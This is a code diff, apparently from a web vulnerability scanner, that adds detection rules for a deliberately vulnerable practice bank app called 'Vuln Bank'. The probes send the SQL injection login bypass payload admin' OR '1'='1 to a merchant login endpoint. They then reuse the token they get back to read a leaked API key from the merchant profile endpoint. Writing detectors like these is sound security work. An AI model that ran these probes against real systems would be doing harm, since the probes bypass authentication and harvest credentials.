@@ -26189,7 +26189,7 @@ const vulnbankSqliLoginLiveOracle: Rule = async (ctx) => {
 const vulnbankSqliLoginRouteLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/\/login\b/i.test(pageUrl)) return NEGATIVE;
+  if (!/\/login\b/i.test(pageUrl) || /\/merchants\/login\b/i.test(pageUrl)) return NEGATIVE;
   const hit = await vulnbankSqliLoginBypassProbe(ctx);
   if (!hit?.fired) return NEGATIVE;
   return {
@@ -26272,6 +26272,167 @@ async function vulnbankProbeUserToken(
   }
   return null;
 }
+
+async function vulnbankMerchantSqliLoginBypassProbe(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return null;
+  const loginUrl = new URL("/api/v1/merchants/login", ctx.origin).toString();
+  const baselinePayload = JSON.stringify({
+    email: `thugir_invalid_${Date.now()}_${Math.random().toString(36).slice(2, 8)}@thugir.invalid`,
+    password: "definitely_wrong_password_xyz"
+  });
+  const baseline = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: baselinePayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  let baselineStatus = "error";
+  try {
+    baselineStatus = String((JSON.parse(baseline.body) as Record<string, unknown>).status ?? "");
+  } catch {
+    return null;
+  }
+  if (baselineStatus === "success") return null;
+
+  const sqliPayload = JSON.stringify({
+    email: "admin' OR '1'='1",
+    password: "x"
+  });
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: sqliPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return null;
+  }
+  const status = String(parsed.status ?? "");
+  const token = String(parsed.token ?? "");
+  const apiKey = String(parsed.api_key ?? "");
+  if (status !== "success" || !token.startsWith("eyJ") || !apiKey.startsWith("vk_")) return null;
+
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: loginUrl,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /api/v1/merchants/login with email admin' OR '1'='1 bypasses merchant authentication and returns api_key + JWT — merchant portal SQL injection login oracle"
+    }
+  };
+}
+
+const vulnbankMerchantSqliLoginLiveOracle: Rule = async (ctx) => {
+  const hit = await vulnbankMerchantSqliLoginBypassProbe(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vulnbankMerchantSqliLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/merchants\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await vulnbankMerchantSqliLoginBypassProbe(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /api/v1/merchants/login route scan — POST with email admin' OR '1'='1 bypasses merchant authentication and returns api_key + JWT — route-specific merchant portal SQL injection login oracle"
+    }
+  };
+};
+
+async function vulnbankMerchantMeDebugDisclosureProbe(ctx: RuleContext): Promise<RuleResult | null> {
+  const sqliHit = await vulnbankMerchantSqliLoginBypassProbe(ctx);
+  if (!sqliHit?.fired) return null;
+  const loginUrl = new URL("/api/v1/merchants/login", ctx.origin).toString();
+  const sqliPayload = JSON.stringify({
+    email: "admin' OR '1'='1",
+    password: "x"
+  });
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: sqliPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  let loginParsed: Record<string, unknown> | null = null;
+  try {
+    loginParsed = JSON.parse(loginDoc.body) as Record<string, unknown>;
+  } catch {
+    return null;
+  }
+  const token = String(loginParsed.token ?? "");
+  if (loginParsed.status !== "success" || !token.startsWith("eyJ")) return null;
+
+  const meUrl = new URL("/api/v1/merchants/me", ctx.origin).toString();
+  const meDoc = await ctx.probe.get(meUrl, {
+    method: "GET",
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (meDoc.status < 200 || meDoc.status >= 300) return null;
+  let meParsed: Record<string, unknown> | null = null;
+  try {
+    meParsed = JSON.parse(meDoc.body) as Record<string, unknown>;
+  } catch {
+    return null;
+  }
+  const debugInfo = meParsed.debug_info;
+  if (
+    meParsed.status !== "success" ||
+    !debugInfo ||
+    typeof debugInfo !== "object" ||
+    !String((debugInfo as { api_key?: unknown }).api_key ?? "").startsWith("vk_")
+  ) {
+    return null;
+  }
+
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: meUrl,
+      snippet: meDoc.body.slice(0, 280).trim(),
+      note: "Vuln Bank GET /api/v1/merchants/me echoes debug_info.api_key in the JSON response — merchant profile sensitive-data disclosure oracle"
+    }
+  };
+}
+
+const vulnbankMerchantMeDebugDisclosureLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const hit = await vulnbankMerchantMeDebugDisclosureProbe(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vulnbankMerchantMeDebugDisclosureRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/merchants\/(?:me|login)\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await vulnbankMerchantMeDebugDisclosureProbe(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /api/v1/merchants/me route scan — GET echoes debug_info.api_key in merchant profile JSON — route-specific merchant sensitive-data disclosure oracle"
+    }
+  };
+};
 
 const vulnbankMerchantRegisterLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
@@ -98999,6 +99160,10 @@ export const RULES: Record<string, Rule> = {
   vulnbankBoplaRegisterRouteLiveOracle,
   vulnbankSqliLoginLiveOracle,
   vulnbankSqliLoginRouteLiveOracle,
+  vulnbankMerchantSqliLoginLiveOracle,
+  vulnbankMerchantSqliLoginRouteLiveOracle,
+  vulnbankMerchantMeDebugDisclosureLiveOracle,
+  vulnbankMerchantMeDebugDisclosureRouteLiveOracle,
   vulnbankMerchantRegisterLiveOracle,
   vulnbankMerchantRegisterRouteLiveOracle,
   vulnbankBillPaymentsNegativeAmountLiveOracle,
